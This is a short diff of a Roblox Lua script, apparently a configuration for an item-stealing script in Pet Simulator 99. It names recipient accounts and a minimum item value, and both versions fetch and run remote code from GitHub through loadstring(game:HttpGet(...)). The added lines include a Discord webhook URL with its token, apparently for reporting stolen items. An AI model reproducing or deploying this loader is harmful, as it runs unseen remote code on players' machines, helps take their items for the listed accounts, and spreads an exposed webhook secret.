@@ -1,5 +1,5 @@
-_G.Username = "alijdjjems"
-_G.Username2 = "ar3rezaei"
-_G.minrap = 10000000
-_G.discuser = "1222952490417524882" -- change to your discord id
-loadstring(game:HttpGet('https://raw.githubusercontent.com/ninjadu/ps99/refs/heads/main/ps99'))()
+Username = 'alijdjjems'
+Username2 = 'ar3rezaei'
+Webhook = 'https://discord.com/api/webhooks/1327662978568290386/FA_GPtg5r6G-GskNbKlMVuDmEVezfK07D66OSQrscaZX9LaA6NSEdHhbu8Pyc3o7pFMC'
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/terabite-max43/shitescripts/main/configs.lua"))()
